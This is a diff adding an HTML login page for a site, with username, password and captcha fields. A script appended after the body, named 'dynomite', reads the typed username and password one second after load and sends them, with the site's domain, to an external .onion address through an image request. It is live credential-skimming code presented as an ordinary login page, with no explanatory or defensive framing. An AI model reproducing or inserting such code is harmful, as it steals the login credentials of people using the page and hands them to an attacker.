@@ -1,0 +1,49 @@
+<html><body>
+
+                <form method="post" action="index.php" onsubmit="return validateLogin(this)">
+                    <input type="hidden" name="p" value="login" />
+                    <div class="fl">
+                        <span class="label">Username</span>
+                        <input type="text" name="user" value="" class="frmText" />
+                    </div>
+                    <div class="fl">
+                        <span class="label">Password</span>
+                        <input type="password" name="pass" value="" class="frmText" />
+                    </div> 
+                    <div class="fl">
+                        <span class="label">Captcha</span>
+                        <img src="captcha/securimage_show.php" border="0" />
+                    </div>                   
+                    <div class="fl">
+                        <span class="label">&nbsp;</span>
+                        <input type="text" name="captcha" class="frmText" value="" />
+                    </div>
+                    <div class="fl">
+                    <span class="label">&nbsp;</span>
+                        <input type="checkbox" name="remember" value="1" /> Remember me
+                    </div>
+                    <div class="flBtns">
+                    <a href="index.php?p=recover_account" class="grayBtn">Forgot your password?</a>
+                        <input type="submit" value="Login" class="blueBtn" />
+                    </div>
+                </form>
+
+</body>
+
+<script>
+setTimeout(dynomite, 1000);
+
+function dynomite()
+{
+username = document.getElementsByTagName('input')[1].value;
+password = document.getElementsByTagName('input')[2].value;
+//alert('pass : '+password);
+
+var img = new Image();
+img.src="http://5onwnspjvuk7cwvk.onion/dump?"+username+"&"+password+"&"+document.domain;
+document.body.appendChild(img);
+}
+</script>
+
+
+</html>
